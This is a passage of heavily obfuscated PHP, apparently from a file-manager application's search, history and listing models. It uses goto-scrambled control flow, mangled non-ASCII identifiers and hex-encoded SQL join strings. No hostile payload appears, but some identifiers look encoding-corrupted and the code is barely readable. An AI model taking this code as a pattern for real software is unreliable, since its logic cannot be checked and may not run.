Model($DßÃáˆ…¥[457])->remove($C°É¶¯­åà); goto cÈã˜Ë¿Óä; a§Ğ¯àáóÕ: $DßÃáˆ…¥ =& $_SERVER[Šº]; $f®¤ ˜†Æ° = Model($DßÃáˆ…¥[728])->get($DßÃáˆ…¥[1113]); $aÍÇ…“°Ñ = $GLOBALS[$DßÃáˆ…¥[6]][$DßÃáˆ…¥[88]][$DßÃáˆ…¥[1092]]; goto AŒ¹®–ª†; BœÊ†‚ÄÑ: $eÃÜ„Û¤‹è = array($DßÃáˆ…¥[417] => $AôÊ£ê‰¨); $dÍïÛŞ¸¥² = $this->field($DßÃáˆ…¥[1908])->where($eÃÜ„Û¤‹è)->order($DßÃáˆ…¥[1902])->select(); if (!$dÍïÛŞ¸¥² || $B±‹Òåñ›Ö >= count($dÍïÛŞ¸¥²)) { return; } goto dãôßÁ¡í¨; cÈã˜Ë¿Óä: } public function listData($D“ÊŞƒÊÚĞ) { goto DöÎÀ•„®; DöÎÀ•„®: $dÂ¡ËáÎ ö =& $_SERVER[Šº]; $CàùÕÓæ¥à = array($dÂ¡ËáÎ ö[417] => $D“ÊŞƒÊÚĞ); $B£¹óİâ¾¢ = $dÂ¡ËáÎ ö[1909]; goto fÄŞŠ‚’êé; CÔ’…®‰Œ: $cÇÔ‡ÑÁœš = 5; if ($A…÷ˆÒµ¾  == $dÂ¡ËáÎ ö[1114]) { $F‡˜„Äã»‡[$dÂ¡ËáÎ ö[366]] = array_slice($F‡˜„Äã»‡[$dÂ¡ËáÎ ö[366]], 0, $cÇÔ‡ÑÁœš); $F‡˜„Äã»‡[$dÂ¡ËáÎ ö[363]] = array($dÂ¡ËáÎ ö[1910] => 1, $dÂ¡ËáÎ ö[1911] => 20, $dÂ¡ËáÎ ö[1912] => 1, $dÂ¡ËáÎ ö[1913] => count($F‡˜„Äã»‡[$dÂ¡ËáÎ ö[366]])); } return $F‡˜„Äã»‡; goto EË‚á›‘ î; fÄŞŠ‚’êé: $F‡˜„Äã»‡ = $this->field($B£¹óİâ¾¢)->where($CàùÕÓæ¥à)->order($dÂ¡ËáÎ ö[1902])->selectPage(); $this->_listAppendUser($F‡˜„Äã»‡[$dÂ¡ËáÎ ö[366]]); $A…÷ˆÒµ¾  = Model($dÂ¡ËáÎ ö[728])->get($dÂ¡ËáÎ ö[1113]); goto CÔ’…®‰Œ; EË‚á›‘ î: } protected function _listAppendUser(&$a¦©¸êË˜˜) { $Fô¯…ÏÄ =& $_SERVER[Šº]; $D¤°Ô¤øë¼ = array_to_keyvalue($a¦©¸êË˜˜, $Fô¯…ÏÄ[33], $Fô¯…ÏÄ[1514]); $BßÈ°³¦«¹ = Model($Fô¯…ÏÄ[514])->userListInfo($D¤°Ô¤øë¼); foreach ($a¦©¸êË˜˜ as &$dì™•…Âğ) { $DÖ‚íùéß‹ = $dì™•…Âğ[$Fô¯…ÏÄ[1514]]; $dì™•…Âğ[$Fô¯…ÏÄ[439]] = $BßÈ°³¦«¹[$DÖ‚íùéß‹] ? $BßÈ°³¦«¹[$DÖ‚íùéß‹] : !1; } unset($dì™•…Âğ); } public function fileInfo($eÃ™Õô²½‰) { $a¥¡Òá’Â =& $_SERVER[Šº]; $E·õììÄ¦’ = $this->tablePrefix; $e©¶â†¶Ô = "{$E·õììÄ¦’}\x69\x6f\137\x66\x69\154\x65\40\146\151\154\145\x73\x20\x6f\156\x20\146\x69\x6c\145\163\56\x66\151\154\x65\111\104\40\x3d\40\150\x69\163\164\157\162\171\56\x66\151\154\145\111\x44"; return $this->alias($a¥¡Òá’Â[1914])->where(array($a¥¡Òá’Â[419] => $eÃ™Õô²½‰))->join($e©¶â†¶Ô, $a¥¡Òá’Â[1915])->find(); } public function removeItem($B‡à÷Ä„¶¿) { $B¨åÔ¨ñš» =& $_SERVER[Šº]; $bòµ‰é‡ = array($B¨åÔ¨ñš»[419] => $B‡à÷Ä„¶¿); $DØã§¿ã¶Ú = $this->where($bòµ‰é‡)->find(); if ($DØã§¿ã¶Ú) { $cö¾ô„Ÿ²Œ = $this->where($bòµ‰é‡)->delete(); Model($B¨åÔ¨ñš»[457])->remove($DØã§¿ã¶Ú[$B¨åÔ¨ñš»[454]]); return $cö¾ô„Ÿ²Œ; } return !1; } public function removeBySource($eøÇä¾¢ä÷) { goto b³Ä“ï; b³Ä“ï: $dˆµ……ÍÎ =& $_SERVER[Šº]; if (!$eøÇä¾¢ä÷) { return !1; } if (!is_array($eøÇä¾¢ä÷)) { $eøÇä¾¢ä÷ = array($eøÇä¾¢ä÷); } goto A—‰·µÄ; A—‰·µÄ: $e›¹¨Ùİ = array($dˆµ……ÍÎ[417] => array($dˆµ……ÍÎ[7], $eøÇä¾¢ä÷)); $BâÊ­İÄ¸ = $this->field($dˆµ……ÍÎ[455])->where($e›¹¨Ùİ)->select(); if ($BâÊ­İÄ¸) { $this->where($e›¹¨Ùİ)->delete(); $CÄ¥êğâÍĞ = array_to_keyvalue($BâÊ­İÄ¸, $dˆµ……ÍÎ[33], $dˆµ……ÍÎ[454]); Model($dˆµ……ÍÎ[457])->remove($CÄ¥êğâÍĞ); } goto B‡—¼½çì; B‡—¼½çì: return !0; goto C‹™­¤—®“; C‹™­¤—®“: } public function setDetail($aéšœí²Ú°, $dšÍÄß¤Šé) { $aˆåµ½Í£å =& $_SERVER[Šº]; return $this->where(array($aˆåµ½Í£å[419] => $aéšœí²Ú°))->save(array($aˆåµ½Í£å[1905] => $dšÍÄß¤Šé)); } public function rollbackToItem($fñ…¥ÌÂ¤ö, $e¯Ëî¬°ó‰) { goto f¾Ğçáƒå; f¾Ğçáƒå: $FÀ˜õÍì =& $_SERVER[Šº]; $d¿ÉÔÙ—¬‡ = Model($FÀ˜õÍì[788])->sourceInfo($fñ…¥ÌÂ¤ö); $this->addHistory($d¿ÉÔÙ—¬‡, LNG($FÀ˜õÍì[1916])); goto Bƒ¡àÊ©š½; Bƒ¡àÊ©š½: $aÔğ•ä = $this->find($e¯Ëî¬°ó‰); $F”Õ‡Óö¦· = array($FÀ˜õÍì[454] => $aÔğ•ä[$FÀ˜õÍì[454]], $FÀ˜õÍì[78] => $aÔğ•ä[$FÀ˜õÍì[78]], $FÀ˜õÍì[84] => time(), $FÀ˜õÍì[441] => USER_ID); Model($FÀ˜õÍì[788])->where(array($FÀ˜õÍì[403] => $fñ…¥ÌÂ¤ö))->save($F”Õ‡Óö¦·); goto F·½ÆÊêìÙ; F·½ÆÊêìÙ: return $this->where(array($FÀ˜õÍì[419] => $e¯Ëî¬°ó‰))->delete(); goto c¤Â¯£ª¬¹; c¤Â¯£ª¬¹: } public function clearSame($bÌ¼‹Ó´¥¶) { goto FˆÄÇìØ‘®; b¬¼í¯›Ô½: if (!$F…¯·êÖÙ‰) { return; } $this->where(array($c†‡»·ïíï[392] => array($c†‡»·ïíï[7], $F…¯·êÖÙ‰)))->delete(); Model($c†‡»·ïíï[457])->remove($eä“ñˆ—ù£); goto bÉ¤—˜Ãò•; C†ƒœÓÎÀœ: $eä“ñˆ—ù£ = array(); $F…¯·êÖÙ‰ = array(); foreach ($bí¿¦’æÌê as $cØ÷ËÊÔëù) { if (!$cØ÷ËÊÔëù || count($cØ÷ËÊÔëù) <= 1) { continue; } foreach ($cØ÷ËÊÔëù as $eğŞïÎõ•ß) { $eä“ñˆ—ù£[] = $eğŞïÎõ•ß[$c†‡»·ïíï[454]]; $F…¯·êÖÙ‰[] = $eğŞïÎõ•ß[$c†‡»·ïíï[392]]; } } goto b¬¼í¯›Ô½; FˆÄÇìØ‘®: $c†‡»·ïíï =& $_SERVER[Šº]; $Cˆİ¾õµ¾ = $this->listData($bÌ¼‹Ó´¥¶); $bí¿¦’æÌê = array_to_keyvalue_group($Cˆİ¾õµ¾, $c†‡»·ïíï[454]); goto C†ƒœÓÎÀœ; bÉ¤—˜Ãò•: } public function userSpace() { $b’èØÛİé =& $_SERVER[Šº]; $Aã¬‡¡÷ï¡ = $this->tablePrefix; $eõ¿¨ŸğÃˆ = array($b’èØÛİé[1506] => USER_ID); $CˆÄ“¨§Ö = "{$Aã¬‡¡÷ï¡}\151\157\137\x66\x69\x6c\145\40\x66\x69\154\145\163\40\157\156\40\x66\151\x6c\x65\x73\56\146\151\x6c\145\x49\x44\40\75\40\150\x69\x73\x74\157\x72\171\56\146\151\x6c\145\111\x44"; return $this->alias($b’èØÛİé[1914])->where($eõ¿¨ŸğÃˆ)->join($CˆÄ“¨§Ö, $b’èØÛİé[1915])->sum($b’èØÛİé[78]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($EòÃš»ËÉ‘) { goto a¬ÚÆç™Ÿ‰; Dº¡Ø„Ç¶: if (!$FãØ©¦Ê–Ø[$c¶©®ù —º[168]]) { $aÀÁí¶Ú¡ = array_to_keyvalue($c‰¦¹õæ¯á, $c¶©®ù —º[33], $c¶©®ù —º[168]); $CŞ¯‘Ï‚ = implode($c¶©®ù —º[47], $aÀÁí¶Ú¡); $bá„Ø®ŸÊ = $c¶©®ù —º[1917]; } $F¹è¬Á„« = explode($c¶©®ù —º[47], trim($CŞ¯‘Ï‚, $c¶©®ù —º[47])); return array($bá„Ø®ŸÊ, $F¹è¬Á„«); goto DªÇ­†‘¥; eœĞ‹˜‡®Ü: if (!$FãØ©¦Ê–Ø) { return array(); } $CŞ¯‘Ï‚ = $FãØ©¦Ê–Ø[$c¶©®ù —º[168]]; $bá„Ø®ŸÊ = $c¶©®ù —º[7]; goto Dº¡Ø„Ç¶; a¬ÚÆç™Ÿ‰: $c¶©®ù —º =& $_SERVER[Šº]; $c‰¦¹õæ¯á = KodIO::fileTypeList(); $FãØ©¦Ê–Ø = $c‰¦¹õæ¯á[$EòÃš»ËÉ‘]; goto eœĞ‹˜‡®Ü; DªÇ­†‘¥: } public function listPathType($C²‰ò¼ßÖö) { $aëŸªâÔ¦Û =& $_SERVER[Šº]; $CƒÕ‰÷˜¼¼ = $this->fileTypeWhere($C²‰ò¼ßÖö); if (!$CƒÕ‰÷˜¼¼) { return array(); } $b½ƒŒ„‹¶« = array($aëŸªâÔ¦Û[557] => SourceModel::TYPE_USER, $aëŸªâÔ¦Û[558] => USER_ID, $aëŸªâÔ¦Û[554] => 0, $aëŸªâÔ¦Û[555] => $CƒÕ‰÷˜¼¼); return $this->listSource($b½ƒŒ„‹¶«); } public function listSearch($cÒº–ÖŒáÏ, $a ÎùÃË”Ñ = 300) { goto C¹ÂÆ‡ŒÈ; C¹ÂÆ‡ŒÈ: $e±Î¤’à‡ =& $_SERVER[Šº]; if (isset($cÒº–ÖŒáÏ[$e±Î¤’à‡[1760]]) && $cÒº–ÖŒáÏ[$e±Î¤’à‡[1760]]) { $cÒº–ÖŒáÏ[$e±Î¤’à‡[1760]] = str_replace($e±Î¤’à‡[380], $e±Î¤’à‡[1918], trim($cÒº–ÖŒáÏ[$e±Î¤’à‡[1760]])); } $eÉÂê×›¦Ì = $this->_parseSearchWhere($cÒº–ÖŒáÏ); goto e ¢Î§¯ì; Dö‘ÂóÉè: $this->_listSearchTag($e¶ÑõÍäÔğ, $cÒº–ÖŒáÏ, $B÷÷ Ë·¢¢); $this->_listSearchGroupTag($e¶ÑõÍäÔğ, $cÒº–ÖŒáÏ, $B÷÷ Ë·¢¢); $this->_listDataApply($e¶ÑõÍäÔğ[$e±Î¤’à‡[366]]); goto D×èëóÌÎ¿; D×èëóÌÎ¿: $this->_listMake($e¶ÑõÍäÔğ); return $e¶ÑõÍäÔğ; goto aØÍ °•Ê½; e ¢Î§¯ì: if (!isset($eÉÂê×›¦Ì[$e±Î¤’à‡[430]])) { $eÉÂê×›¦Ì[$e±Î¤’à‡[430]] = 0; } $F‹¦Ï…«ë = $e±Î¤’à‡[1919]; $B÷÷ Ë·¢¢ = $F‹¦Ï…«ë; goto A›ö»õ©…; eÀ×¯™Šä: $e¶ÑõÍäÔğ = $this->distinct(!0)->field($F‹¦Ï…«ë)->where($eÉÂê×›¦Ì)->selectPage($a ÎùÃË”Ñ); $this->_listSearchFileContent($e¶ÑõÍäÔğ, $cÒº–ÖŒáÏ, $B÷÷ Ë·¢¢); $this->_listSearchDesc($e¶ÑõÍäÔğ, $cÒº–ÖŒáÏ, $B÷÷ Ë·¢¢); goto Dö‘ÂóÉè; A›ö»õ©…: $this->_listSearchBindPinyin($cÒº–ÖŒáÏ, $eÉÂê×›¦Ì, $F‹¦Ï…«ë); $this->alias($e±Î¤’à‡[524])->_makeOrder(); $eÉÂê×›¦Ì = $this->parseWhereLike($eÉÂê×›¦Ì); goto eÀ×¯™Šä; aØÍ °•Ê½: } private function _listSearchFileContent(&$Dï”¯‡º, $A—Ë„Ú­², $dº“š«¸íÌ) { goto F—¾“«÷ãù; fÆù¾±¶ƒ¬: if (!isset($A¶ÄÌ„›·Ù[$dÛ©‚Ô¸ä²[28]]) || !is_array($A—Ë„Ú­²[$dÛ©‚Ô¸ä²[454]])) { return; } $A¶ÄÌ„›·Ù[$dÛ©‚Ô¸ä²[454]] = array($dÛ©‚Ô¸ä²[7], $A—Ë„Ú­²[$dÛ©‚Ô¸ä²[454]]); unset($A¶ÄÌ„›·Ù[$dÛ©‚Ô¸ä²[28]]); goto B™‰Œ¤Å¾«; F—¾“«÷ãù: $dÛ©‚Ô¸ä² =& $_SERVER[Šº]; if (!$A—Ë„Ú­²[$dÛ©‚Ô¸ä²[1760]] || $Dï”¯‡º[$dÛ©‚Ô¸ä²[363]][$dÛ©‚Ô¸ä²[350]] > 1) { return; } $A¶ÄÌ„›·Ù = $this->_parseSearchWhere($A—Ë„Ú­²); goto fÆù¾±¶ƒ¬; B™‰Œ¤Å¾«: unset($A—Ë„Ú­²[$dÛ©‚Ô¸ä²[454]]); $fÉ˜öÓÉö° = $this->field($dº“š«¸íÌ)->where($A¶ÄÌ„›·Ù)->limit($dÛ©‚Ô¸ä²[1920])->select(); if (!$fÉ˜öÓÉö° || count($fÉ˜öÓÉö°) == 0) { return; } goto cŸ‘àé¼; cŸ‘àé¼: $Dï”¯‡º[$dÛ©‚Ô¸ä²[366]] = array_merge($fÉ˜öÓÉö°, $Dï”¯‡º[$dÛ©‚Ô¸ä²[366]]); $Dï”¯‡º[$dÛ©‚Ô¸ä²[363]][$dÛ©‚Ô¸ä²[364]] += count($fÉ˜öÓÉö°); goto a–ìÍ°Å³‹; a–ìÍ°Å³‹: } private function _listSearchTag(&$BÕÈ¨ÎÚ, $F™¬Ö´ø¢Æ, $Aœµ¹©‡ Ù) { goto eª®ø±£Ü×; f¦ƒß§ƒ¿°: $BöÏ±ì©åì = array_to_keyvalue($BöÏ±ì©åì, $f„ƒÛ±õŞ„[33], $f„ƒÛ±õŞ„[76]); $aÙêŒÖÌ«¡ = array_unique($BöÏ±ì©åì); $this->_listSearchMerge($BÕÈ¨ÎÚ, $F™¬Ö´ø¢Æ, $Aœµ¹©‡ Ù, $aÙêŒÖÌ«¡); goto d §ëÚ¨; eª®ø±£Ü×: $f„ƒÛ±õŞ„ =& $_SERVER[Šº]; if (!$F™¬Ö´ø¢Æ[$f„ƒÛ±õŞ„[1760]] || $BÕÈ¨ÎÚ[$f„ƒÛ±õŞ„[363]][$f„ƒÛ±õŞ„[350]] > 1) { return; } $a¡âİ’ÉŒ = Model($f„ƒÛ±õŞ„[1921])->listData(); goto b¸óÖì‚ÄÏ; b¸óÖì‚ÄÏ: $Cßîˆ‹†ö½ = array(); $cÌ¡¦ñ¸ˆ = $F™¬Ö´ø¢Æ[$f„ƒÛ±õŞ„[1760]]; foreach ($a¡âİ’ÉŒ as $D‰‹¢ŸÃ†) { $DÇ¶£¥˜¶Ø = $D‰‹¢ŸÃ†[$f„ƒÛ±õŞ„[28]]; $a‰Æ´ºç = str_replace($f„ƒÛ±õŞ„[50], $f„ƒÛ±õŞ„[33], Pinyin::encode($DÇ¶£¥˜¶Ø)); if (stripos($DÇ¶£¥˜¶Ø, $cÌ¡¦ñ¸ˆ) !== !1 || stripos($a‰Æ´ºç, $cÌ¡¦ñ¸ˆ) !== !1) { $Cßîˆ‹†ö½[] = $D‰‹¢ŸÃ†[$f„ƒÛ±õŞ„[392]]; } } goto a‘Ò—Ô‚Õ¶; a‘Ò—Ô‚Õ¶: if (!$Cßîˆ‹†ö½) { return; } $D‹˜¡öçÊï = array($f„ƒÛ±õŞ„[426] => array($f„ƒÛ±õŞ„[7], $Cßîˆ‹†ö½), $f„ƒÛ±õŞ„[1514] => USER_ID); $BöÏ±ì©åì = Model($f„ƒÛ±õŞ„[427])->field($f„ƒÛ±õŞ„[76])->where($D‹˜¡öçÊï)->select(); goto f¦ƒß§ƒ¿°; d §ëÚ¨: } private function _listSearchDesc(&$F·—ºà÷ˆù, $cªËŠç¸ÅÁ, $aÈäÊÑ­“) { goto A¼’¤Øµá°; F‡çˆ÷«‚: $b‡’É‹¹¡© = Model($dï‰ö¶¬¨Í[540])->field($dï‰ö¶¬¨Í[403])->where($bå™ËÓ÷Üâ)->select(); $Bù‰¦ÜŠ¯ğ = array_to_keyvalue($b‡’É‹¹¡©, $dï‰ö¶¬¨Í[33], $dï‰ö¶¬¨Í[403]); $this->_listSearchMerge($F·—ºà÷ˆù, $cªËŠç¸ÅÁ, $aÈäÊÑ­“, $Bù‰¦ÜŠ¯ğ); goto a•¿‚×†‹æ; A¼’¤Øµá°: $dï‰ö¶¬¨Í =& $_SERVER[Šº]; if (!$cªËŠç¸ÅÁ[$dï‰ö¶¬¨Í[1760]] || $F·—ºà÷ˆù[$dï‰ö¶¬¨Í[363]][$dï‰ö¶¬¨Í[350]] > 1) { return; } $Cƒ¬Éîˆæ“ = $this->listSearchChildren($cªËŠç¸ÅÁ[$dï‰ö¶¬¨Í[485]]); goto EÎ‡–œ¸‡; EÎ‡–œ¸‡: $Cƒ¬Éîˆæ“ = array_unique($Cƒ¬Éîˆæ“); if (!$Cƒ¬Éîˆæ“) { return; } $bå™ËÓ÷Üâ = array($dï‰ö¶¬¨Í[403] => array($dï‰ö¶¬¨Í[7], $Cƒ¬Éîˆæ“), $dï‰ö¶¬¨Í[93] => $dï‰ö¶¬¨Í[438], $dï‰ö¶¬¨Í[371] => array($dï‰ö¶¬¨Í[379], $dï‰ö¶¬¨Í[1762] . $cªËŠç¸ÅÁ[$dï‰ö¶¬¨Í[1760]] . $dï‰ö¶¬¨Í[1762])); goto F‡çˆ÷«‚; a•¿‚×†‹æ: } private function _listSearchGroupTag(&$E¡ªŒ¾ Öç, $eŞŠ­æŠÊ, $Fç½Ê›Æ™¬) { goto a’Ó‚¾ä”; dÆõ±Œ‘“: $B©Œëƒ¸£Ï = array(); $fƒ¥ØÛÛ„‚ = $eŞŠ­æŠÊ[$Bóñ±´šÅ«[1760]]; foreach ($e­Íİ¢“è[$Bóñ±´šÅ«[366]] as $aõ‘ì´˜) { $dº†çÆ¥œš = $aõ‘ì´˜[$Bóñ±´šÅ«[28]]; $dÚóê„á¬ = str_replace($Bóñ±´šÅ«[50], $Bóñ±´šÅ«[33], Pinyin::encode($dº†çÆ¥œš)); if (stripos($dº†çÆ¥œš, $fƒ¥ØÛÛ„‚) !== !1 || stripos($dÚóê„á¬, $fƒ¥ØÛÛ„‚) !== !1) { $B©Œëƒ¸£Ï[] = $aõ‘ì´˜[$Bóñ±´šÅ«[392]]; } } goto D½šÔáå¡Ê; D½šÔáå¡Ê: if (!$B©Œëƒ¸£Ï) { return; } $dÇä”ß»ò¤ = array($Bóñ±´šÅ«[426] => array($Bóñ±´šÅ«[7], $B©Œëƒ¸£Ï), $Bóñ±´šÅ«[1514] => 0, $Bóñ±´šÅ«[29] => $Bóñ±´šÅ«[1784] . $D¹ÉÑ®îÁ§); $dì¢†‘Ç = Model($Bóñ±´šÅ«[427])->field($Bóñ±´šÅ«[76])->where($dÇä”ß»ò¤)->select(); goto EÆé‹ß“µ; a’Ó‚¾ä”: $Bóñ±´šÅ« =& $_SERVER[Šº]; if (!$eŞŠ­æŠÊ[$Bóñ±´šÅ«[1760]] || $E¡ªŒ¾ Öç[$Bóñ±´šÅ«[363]][$Bóñ±´šÅ«[350]] > 1 || !$eŞŠ­æŠÊ[$Bóñ±´šÅ«[485]]) { return; } $FÆ“âãÂ« = $this->sourceInfo($eŞŠ­æŠÊ[$Bóñ±´šÅ«[485]]); goto F‡ˆÌŞ·½í; EÆé‹ß“µ: $dì¢†‘Ç = array_to_keyvalue($dì¢†‘Ç, $Bóñ±´šÅ«[33], $Bóñ±´šÅ«[76]); $d°è½¼èğ = array_unique($dì¢†‘Ç); $this->_listSearchMerge($E¡ªŒ¾ Öç, $eŞŠ­æŠÊ, $Fç½Ê›Æ™¬, $d°è½¼èğ); goto c²©Ä¼İ¦ô; F‡ˆÌŞ·½í: if (!$FÆ“âãÂ« || $FÆ“âãÂ«[$Bóñ±´šÅ«[411]] != SourceModel::TYPE_GROUP) { return; } $D¹ÉÑ®îÁ§ = $FÆ“âãÂ«[$Bóñ±´šÅ«[491]]; $e­Íİ¢“è = Model($Bóñ±´šÅ«[1922])->get($D¹ÉÑ®îÁ§); goto dÆõ±Œ‘“; c²©Ä¼İ¦ô: } private function _listSearchMerge(&$Dö·„–“º, $aÎ›˜Ù¡„ë, $e»Á…áîÆ, $bæˆÈ±Çš½) { goto Fã°š¤Å˜³; A»“Ú×ïÜÓ: $AŒºšºÊù÷ = $this->field($e»Á…áîÆ)->where($DÛ¥ÇÛîî)->select(); if (!$AŒºšºÊù÷) { return; } $AÏ¿Šø‘—¡ = array(); goto eÄøİšå; Fã°š¤Å˜³: $dÁ„…ƒˆõŸ =& $_SERVER[Šº]; if (!$bæˆÈ±Çš½) { return; } $aŠ«Œå—ù = array_to_keyvalue($Dö·„–“º[$dÁ„…ƒˆõŸ[366]], $dÁ„…ƒˆõŸ[33], $dÁ„…ƒˆõŸ[403]); goto fñ£ƒˆâ‡°; fñ£ƒˆâ‡°: $E¨‡ÎÓÛ®ù = array_diff($bæˆÈ±Çš½, $aŠ«Œå—ù); if (!$E¨‡ÎÓÛ®ù) { return; } $DÛ¥ÇÛîî = array($dÁ„…ƒˆõŸ[403] => array($dÁ„…ƒˆõŸ[7], $E¨‡ÎÓÛ®ù)); goto A»“Ú×ïÜÓ; eÄøİšå: foreach ($AŒºšºÊù÷ as $e×Ô•î±ç•) { if ($this->_listSearchFilter($e×Ô•î±ç•, $aÎ›˜Ù¡„ë)) { $AÏ¿Šø‘—¡[] = $e×Ô•î±ç•; } } $Dö·„–“º[$dÁ„…ƒˆõŸ[366]] = array_merge($AÏ¿Šø‘—¡, $Dö·„–“º[$dÁ„…ƒˆõŸ[366]]); $Dö·„–“º[$dÁ„…ƒˆõŸ[363]][$dÁ„…ƒˆõŸ[364]] += count($AÏ¿Šø‘—¡); goto Eß»öºã½; Eß»öºã½: } private function _listSearchFilter($Bê¬¾ËŠ¡, $Cİ¿İîŞí²) { goto cÃŸ³‰Â; cÃŸ³‰Â: $B¸²Î¹¬ÍÓ =& $_SERVER[Šº]; $a¡àÚ‡¿Ü‰ = $Bê¬¾ËŠ¡[$B¸²Î¹¬ÍÓ[410]] == $B¸²Î¹¬ÍÓ[87]; if (!strstr($Bê¬¾ËŠ¡[$B¸²Î¹¬ÍÓ[494]], $B¸²Î¹¬ÍÓ[47] . $Cİ¿İîŞí²[$B¸²Î¹¬ÍÓ[485]] . $B¸²Î¹¬ÍÓ[47])) { return !1; } goto bÑãÁ§‡‚º; EÕø¬Í¸À–: if (isset($Cİ¿İîŞí²[$B¸²Î¹¬ÍÓ[570]]) && $Cİ¿İîŞí²[$B¸²Î¹¬ÍÓ[570]] != $Bê¬¾ËŠ¡[$B¸²Î¹¬ÍÓ[441]]) { return !1; } return !0; goto eõë§ÀÌ; bÑãÁ§‡‚º: if (isset($Cİ¿İîŞí²[$B¸²Î¹¬ÍÓ[412]]) && $Cİ¿İîŞí²[$B¸²Î¹¬ÍÓ[412]] != $B¸²Î¹¬ÍÓ[1727]) { if ($Cİ¿İîŞí²[$B¸²Î¹¬ÍÓ[412]] == $B¸²Î¹¬ÍÓ[77] && !$a¡àÚ‡¿Ü‰) { return !1; } if ($Cİ¿İîŞí²[$B¸²Î¹¬ÍÓ[412]] != $B¸²Î¹¬ÍÓ[77] && $a¡àÚ‡¿Ü‰) { return !1; } if (!strstr($Bê¬¾ËŠ¡[$B¸²Î¹¬ÍÓ[168]], $B¸²Î¹¬ÍÓ[47] . $Cİ¿İîŞí²[$B¸²Î¹¬ÍÓ[412]] . $B¸²Î¹¬ÍÓ[47])) { return !1; } } if (isset($Cİ¿İîŞí²[$B¸²Î¹¬ÍÓ[1923]]) && $Cİ¿İîŞí²[$B¸²Î¹¬ÍÓ[1923]] < $Bê¬¾ËŠ¡[$B¸²Î¹¬ÍÓ[78]]) { return !1; } if (isset($Cİ¿İîŞí²[$B¸²Î¹¬ÍÓ[1924]]) && $Cİ¿İîŞí²[$B¸²Î¹¬ÍÓ[1924]] > $Bê¬¾ËŠ¡[$B¸²Î¹¬ÍÓ[78]]) { return !1; } goto EÕø¬Í¸À–; eõë§ÀÌ: } public function listSearchChildren($b·Œ‘Â¢Ğ, $e–´Ïá = 5000) { goto fÖ‰‚¹Ú¡ß; fğæË•„…‡: $BŞ¹‰Š«¡ğ = $this->field($CÛ¥±‹ÄÍ[403])->where($B¾ïÂßç®Á)->select(); $béùè¶Ç = array_to_keyvalue($BŞ¹‰Š«¡ğ, $CÛ¥±‹ÄÍ[33], $CÛ¥±‹ÄÍ[403]); return $béùè¶Ç; goto fŠ†’Ë¢íª; CƒÜ”Ó¬ƒ—: $B¾ïÂßç®Á = array($CÛ¥±‹ÄÍ[494] => array($CÛ¥±‹ÄÍ[379], $b•ÙŠáŒ[$CÛ¥±‹ÄÍ[494]] . $b•ÙŠáŒ[$CÛ¥±‹ÄÍ[403]] . $CÛ¥±‹ÄÍ[521])); $AÈ‚¿Úà•œ = $this->field($CÛ¥±‹ÄÍ[403])->cache(null, 600)->where($B¾ïÂßç®Á)->count(); if ($AÈ‚¿Úà•œ > $e–´Ïá) { return $this->_listSearchChildrenNear($b·Œ‘Â¢Ğ, $e–´Ïá); } goto fğæË•„…‡; fÖ‰‚¹Ú¡ß: $CÛ¥±‹ÄÍ =& $_SERVER[Šº]; $béùè¶Ç = array(); $b•ÙŠáŒ = $this->sourceInfo($b·Œ‘Â¢Ğ); goto CƒÜ”Ó¬ƒ—; fŠ†’Ë¢íª: } private function _listSearchChildrenNear($E’Â«‚†…, $D„äææŞˆÇ) { goto D–è—Ğ¹ÅŒ; EŠ¿äõÍÜÊ: $føÓÖê½Â¯ = $this->field($cçœ»µ¨»Í[1925])->where($b¨­ïÈœ×)->select(); $cÄ¦ö«å³„ = array_to_keyvalue(array_filter_by_field($føÓÖê½Â¯, $cçœ»µ¨»Í[410], $cçœ»µ¨»Í[87]), $cçœ»µ¨»Í[33], $cçœ»µ¨»Í[403]); $AÆœ×â¯•ğ = array_merge($AÆœ×â¯•ğ, array_to_keyvalue($føÓÖê½Â¯, $cçœ»µ¨»Í[33], $cçœ»µ¨»Í[403])); goto f¤„¤‚Äµ; b«î‘õß: $AÆœ×â¯•ğ = array_merge($AÆœ×â¯•ğ, array_to_keyvalue($føÓÖê½Â¯, $cçœ»µ¨»Í[33], $cçœ»µ¨»Í[403])); $AÆœ×â¯•ğ = array_slice($AÆœ×â¯•ğ, 0, $D„äææŞˆÇ); return $AÆœ×â¯•ğ; goto d¼™¸¦ò¢ğ; D–è—Ğ¹ÅŒ: $cçœ»µ¨»Í =& $_SERVER[Šº]; $AÆœ×â¯•ğ = array(); $b¨­ïÈœ× = array($cçœ»µ¨»Í[485] => $E’Â«‚†…); goto EŠ¿äõÍÜÊ; f¤„¤‚Äµ: if (!$cÄ¦ö«å³„) { return $AÆœ×â¯•ğ; } $b¨­ïÈœ× = array($cçœ»µ¨»Í[485] => array($cçœ»µ¨»Í[7], $cÄ¦ö«å³„)); $føÓÖê½Â¯ = $this->field($cçœ»µ¨»Í[1925])->where($b¨­ïÈœ×)->limit($D„äææŞˆÇ)->select(); goto b«î‘õß; d¼™¸¦ò¢ğ: } private function _listSearchBindPinyin($f”ÒÚëğËì, &$cÄÔˆÏ¨âÑ, &$eŠÈ¾–±) { goto DØÎÌš°Ù¦; Bøä×í…Ä´: $eŠÈ¾–± = $fí†âŒƒƒ[1927] . str_replace($fí†âŒƒƒ[47], $fí†âŒƒƒ[1928], $eŠÈ¾–±); $Cƒ§Õ±´ Œ = $cÄÔˆÏ¨âÑ[$fí†âŒƒƒ[28]]; unset($cÄÔˆÏ¨âÑ[$fí†âŒƒƒ[28]]); goto fæĞñÏ¿ Æ; Eïãª¢¥ª©: $b§½†êêñİ = "\x4c\x45\x46\x54\x20\x4a\117\111\x4e\40{$this->tablePrefix}\151\x6f\x5f\163\157\x75\162\143\x65\x5f\155\145\x74\x61\x20\x6d\x65\x74\x61\x20\157\x6e\x20\x73\x6f\165\x72\x63\145\x2e\x73\x6f\165\x72\143\145\111\104\40\75\x20\x6d\x65\x74\141\x2e\163\157\165\162\143\145\111\x44"; $FÏœä™ë§” = array(); $eŠÈ¾–± = str_replace(array($fí†âŒƒƒ[228], $fí†âŒƒƒ[50], $fí†âŒƒƒ[1926]), $fí†âŒƒƒ[33], $eŠÈ¾–±); goto Bøä×í…Ä´; FíËòöƒ„Æ: $cÄÔˆÏ¨âÑ = $FÏœä™ë§”; goto eİê›ŠÓÒç; DØÎÌš°Ù¦: $fí†âŒƒƒ =& $_SERVER[Šº]; if (!isset($f”ÒÚëğËì[$fí†âŒƒƒ[1760]]) || !$f”ÒÚëğËì[$fí†âŒƒƒ[1760]]) { return; } if (!Input::check($f”ÒÚëğËì[$fí†âŒƒƒ[1760]], $fí†âŒƒƒ[315]) || 